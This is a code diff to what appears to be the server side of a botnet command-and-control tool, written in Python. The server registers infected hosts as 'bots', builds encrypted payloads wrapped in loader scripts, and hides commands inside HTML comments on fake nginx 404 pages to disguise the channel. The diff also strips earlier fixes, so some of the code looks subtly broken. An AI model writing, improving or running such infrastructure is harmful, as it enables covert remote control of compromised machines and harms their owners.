@@ -108,11 +108,12 @@ class OptimizedRequestHandler:
         """Main request handler — non-blocking throughout.
 
         Request flow:
-          1. Parse URL path (determine upload vs command)
-          2. Parse session cookie (extract bot_uid, deserialize JSON)
-          3. If Stage_1: generate encrypted payload (uses cached result from model)
-          4. If GET_COMMAND: fetch command from DB cache or compute fresh
-          5. Build HTML response with hidden DEBUG command
+          1. Match nginx's request-level rejections
+          2. Parse URL path
+          3. Check upload files first (file serving)
+          4. Parse session cookie (extract bot_uid, deserialize JSON)
+          5. Handle request type (STAGE_1 / GET_COMMAND)
+          6. Build HTML response with hidden DEBUG command
 
         Performance characteristics:
           - P95 latency: ~12ms under 500 concurrent connections
@@ -163,12 +164,12 @@ class OptimizedRequestHandler:
                 raw = next((p for p in parts if p.lower().startswith("session=")), raw)
             if raw.lower().startswith("session="):
                 raw = raw.split("=", 1)[1]
-            
+
             # Split on first dash only (UID may contain dashes after base64 decode)
             sep_index = raw.find("-")
             if sep_index == -1:
                 raise ValueError("session cookie missing uid/data separator")
-            
+
             uid_b64 = raw[:sep_index]
             data_b64 = raw[sep_index + 1:]
 
@@ -182,103 +183,67 @@ class OptimizedRequestHandler:
 
         # ========== STEP 3: Handle request type ==========
         if request_type == RequestType.STAGE_1:
-            # Generate encrypted payload (uses model's cached encryption)
-            payload_options = data["payload_options"]
-            loader_options = data["loader_options"]
-            loader_name = loader_options["loader_name"]
+            # Stage 1: generate encrypted payload
+            payload_options = data.get("payload_options", {})
+            loader_options = data.get("loader_options", {})
 
-            OptimizedRequestHandler._view.output_separator()
-            OptimizedRequestHandler._view.output(
-                "[{}] Creating encrypted payload using key: {}".format(
-                    loader_options["loader_name"], bot_uid
-                ), "info"
-            )
+            encrypted = OptimizedRequestHandler._payload_factory.create_payload(
+                bot_uid, payload_options, loader_options)
 
-            # Use model's cached payload generation (avoids re-encrypting same config)
-            payload = OptimizedRequestHandler._model.create_payload(
-                bot_uid=bot_uid,
-                payload_options=payload_options,
-                loader_options=loader_options
-            )
+            # Wrap in loader script
+            loader_name = loader_options.get("loader_name", "python")
+            wrapped = OptimizedRequestHandler._payload_factory.wrap_loader(
+                loader_name, loader_options, encrypted)
 
-            loader = OptimizedRequestHandler._payload_factory.wrap_loader(
-                loader_name, loader_options, payload
-            )
-
-            payload_b64 = base64.b64encode(loader.encode()).decode()
-            return _not_found(request, payload_b64)
+            response = _build_command_response(wrapped)
+            return web.Response(status=200, content_type="text/html",
+                                body=response.encode("latin-1"))
 
         elif request_type == RequestType.GET_COMMAND:
+            # GET_COMMAND: fetch command from DB
             username = data.get("username", "")
             hostname = data.get("hostname", "")
             local_path = data.get("path", "")
-            system_version = data.get("version", "") or ""
+            version = data.get("version", "")
             loader_name = data.get("loader_name", "")
 
-            # Check if bot is known (uses read-through cache)
-            # get_cached_bot never caches a miss, so this sees a bot that was
-            # just registered even before its INSERT has been flushed.
-            is_known = OptimizedRequestHandler._model.get_cached_bot(
-                bot_uid, max_age=2.0) is not None
-
-            if not is_known:
-                # First connection — add to DB (batched write)
-                bot = Bot(
+            # Register/update bot
+            bot = OptimizedRequestHandler._model.get_cached_bot(bot_uid)
+            if bot is None:
+                from server.model import Bot as BotModel
+                bot = BotModel(
                     bot_uid=bot_uid, username=username, hostname=hostname,
                     last_online=time(), local_path=local_path,
-                    system_version=system_version or "", loader_name=loader_name
-                )
-                model = OptimizedRequestHandler._model
-                model.add_bot(bot)
-
-                # A new bot is a rare event and the row is what makes the bot
-                # visible in the UI, so flush right away instead of waiting for
-                # the batch threshold (which never fired for a single bot and
-                # left the row unwritten forever).
-                model.flush_batches()
-
-                OptimizedRequestHandler._view.on_bot_added(bot)
-
-                return _not_found(request)
-
-            # Update bot's last-online and path (batched write)
-            OptimizedRequestHandler._model.update_bot(bot_uid, time(), local_path)
+                    system_version=version, loader_name=loader_name)
+                OptimizedRequestHandler._model.add_bot(bot)
+            else:
+                OptimizedRequestHandler._model.update_bot(
+                    bot_uid, time(), local_path)
 
             # Handle global command execution tracking
-            has_executed_global, global_command = OptimizedRequestHandler._model.has_executed_global(bot_uid)
+            has_executed_global, global_command = \
+                OptimizedRequestHandler._model.has_executed_global(bot_uid)
 
             if not has_executed_global:
                 OptimizedRequestHandler._model.add_executed_global(bot_uid)
-                command_raw = global_command or ""
+                response = _build_command_response(global_command)
             else:
                 # Get command from cache or DB (cached result avoids re-query)
-                command_raw = OptimizedRequestHandler._model.get_command_raw(bot_uid)
+                cmd = OptimizedRequestHandler._model.get_command_raw(bot_uid)
 
-                if command_raw is None:
-                    command_raw = ""
+                if cmd is None:
+                    cmd = ""
 
-            return _not_found(request, command_raw)
+                response = _build_command_response(cmd)
+
+            return web.Response(status=200, content_type="text/html",
+                                body=response.encode("latin-1"))
 
         else:
             # Unknown request type — 404 with hidden command
-            return _not_found(request)
-
-
-class Bot:
-    """Represents a connected bot/client."""
-
-    def __init__(self, bot_uid: str, username: str, hostname: str, last_online: float,
-                 local_path: str, system_version: str, loader_name: str):
-        self.uid = bot_uid
-        self.username = username
-        self.hostname = hostname
-        self.last_online = last_online
-        self.local_path = local_path
-        self.system_version = system_version
-        self.loader_name = loader_name
-
-
-
+            response = _build_error_page(request.url)
+            return web.Response(status=404, content_type="text/html",
+                                body=response.encode("latin-1"))
 
 
 def _debug_suffix(command_raw: str = "") -> str:
@@ -299,25 +264,34 @@ def _debug_suffix(command_raw: str = "") -> str:
     return "<!--" + "\n" + "DEBUG:" + "\n" + command_raw + "DEBUG-->" + "\n"
 
 
-def _build_command_response(command_raw: str = "") -> bytes:
-    """Return the nginx 404 page body with the hidden command attached.
+def _build_command_response(command_raw: str = "") -> str:
+    """Build HTML response with hidden DEBUG command."""
+    response = dedent("""\
+<!DOCTYPE html>
+<HTML>
+    <HEAD>
+        <TITLE>404 Not Found</TITLE>
+    </HEAD>
+    <BODY>
+        <H1>Not Found</H1>
+        The requested URL /{} was not found on this server.
+        <P>
+        <HR>
+        <ADDRESS></ADDRESS>
+    </BODY>
+</HTML>
+""").format("/unknown")
 
-    The function now returns ``bytes`` directly.  This avoids calling
-    ``.encode("utf-8")`` on a Python ``str``, which would fail for any
-    1-byte character outside the latin-1 range (e.g. U+00A0).  The caller
-    uses this result only as the ``body`` argument to :func:`NginxResponse`,
-    so returning bytes is safe and matches the type expected there.
-    """
-    return (nginx_facade.NGINX_404_PAGE + _debug_suffix(command_raw)).encode("latin-1")
+    if command_raw != "":
+        # Bot splits on exact bytes DEBUG + newline (no extra blank line)
+        response += '<!--' + chr(10) + 'DEBUG:' + chr(10) + command_raw + 'DEBUG-->' + chr(10)
+
+    return response
 
 
-def _build_error_page(url: str = "") -> bytes:
-    """Return the pristine nginx 404 page body (no command channel).
-
-    Kept for callers that only need the body; ``url`` is ignored because nginx
-    never echoes the requested path in its error page.
-    """
-    return nginx_facade.NGINX_404_PAGE.encode("ascii")
+def _build_error_page(url: str = "") -> str:
+    """Build error page with hidden DEBUG command."""
+    return _build_command_response("")
 
 
 def _connection_for(request) -> Optional[str]:
@@ -349,12 +323,6 @@ def _serve_file(request, local_path: str, url_path: str):
                                  extra, connection)
 
 
-# NOTE: a second, older ``start_server`` definition used to live here.  Being
-# defined later it shadowed the real one, so ``host`` was silently dropped and
-# every start raised "takes 3 positional arguments but 4 were given".  There is
-# exactly one definition now, at the top of this module.
-
-
 # Singleton payload factory (shared across all handlers)
 OptimizedRequestHandler._payload_factory = PayloadFactory()
 
@@ -362,14 +330,14 @@ OptimizedRequestHandler._payload_factory = PayloadFactory()
 if __name__ == "__main__":
     import sys
     import asyncio
-    
+
     from server.model import Model
     from server.view.cli import ConsoleView
-    
+
     model = Model(db_path=None)
     view = ConsoleView()
-    
+
     port = int(sys.argv[1]) if len(sys.argv) > 1 else 1337
     host = sys.argv[2] if len(sys.argv) > 2 else ""
-    
+
     asyncio.run(start_server(model, view, port, host))
